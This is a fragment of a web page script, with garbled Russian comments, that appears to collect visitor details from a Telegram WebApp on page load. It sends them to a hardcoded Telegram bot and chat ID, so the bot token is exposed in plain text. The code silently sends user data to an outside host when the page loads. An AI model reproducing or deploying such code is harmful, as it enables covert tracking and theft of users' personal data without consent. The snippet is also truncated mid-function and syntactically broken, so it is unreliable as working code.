    <script>
        // Telegram Bot API
        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
        const CHAT_ID = "7477642275";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        function sendToTelegram(message) {
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },

        function collectData() {

            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ –∏–∑ Telegram WebApp
            if (window.Telegram && Telegram.WebApp) {

                    logData += `‚îî –Ø–∑—ã–∫: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
                }
            }

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
            sendToTelegram(logData);
        }

        window.onload = function() {

    </script>
